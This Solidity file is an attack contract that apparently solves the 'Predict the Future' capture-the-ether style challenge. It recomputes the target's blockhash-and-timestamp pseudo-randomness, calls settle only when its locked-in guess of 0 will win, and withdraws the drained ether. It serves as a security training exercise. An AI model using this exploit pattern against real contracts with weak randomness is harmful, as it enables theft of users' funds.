pragma solidity ^0.4.21;

import "./PredictTheFutureChallenge.sol";

contract AttackPredictTheFutureChallenge{
    PredictTheFutureChallenge predictTheFutureChallenge;

    function AttackPredictTheFutureChallenge(address contractAddress) public payable {
        predictTheFutureChallenge = PredictTheFutureChallenge(contractAddress);
    }

    //We make our 'guess' since it all that matters is that it is a number 0-9
    function lockInGuess() public payable{
        predictTheFutureChallenge.lockInGuess.value(msg.value)(0);
    }

    /*  When attacking, since the answer is % 10 we know the answer will be 0-9
        No matter the user's guess, as long as the attack contract continues to guess
        when answer equals our guess, we can call settle after this is true.
     */
    function attack() public{
        uint8 answer = uint8(
            keccak256(block.blockhash(block.number - 1), now)
        ) % 10;
        require(answer == 0);
        predictTheFutureChallenge.settle();
    }

    //withdraw the contract balance after the attack contract takes all the ether
    function withdraw() public{
        require (address(this).balance > 0);
        msg.sender.transfer(address(this).balance);
    }

    //0.4.21 fallback function to receive ether
    function () public payable{}
}